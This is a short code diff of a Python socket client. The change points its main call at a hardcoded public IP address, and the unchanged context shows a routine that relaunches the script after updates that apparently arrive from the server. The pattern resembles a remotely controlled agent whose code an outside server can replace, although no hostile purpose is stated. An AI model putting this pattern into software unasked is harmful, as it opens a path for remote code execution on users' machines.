@@ -17,7 +17,7 @@ def update_client(new_data):
     subprocess.Popen([sys.executable, __file__])
     sys.exit(0)  # Close the current instance
 
-def start_client(host='127.0.0.1', port=12345):
+def start_client(host='0.0.0.0', port=12345):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((host, port))
@@ -59,4 +59,4 @@ def start_client(host='127.0.0.1', port=12345):
         s.close()
 
 if __name__ == "__main__":
-    start_client()
+    start_client(host='164.92.247.14', port=12345)
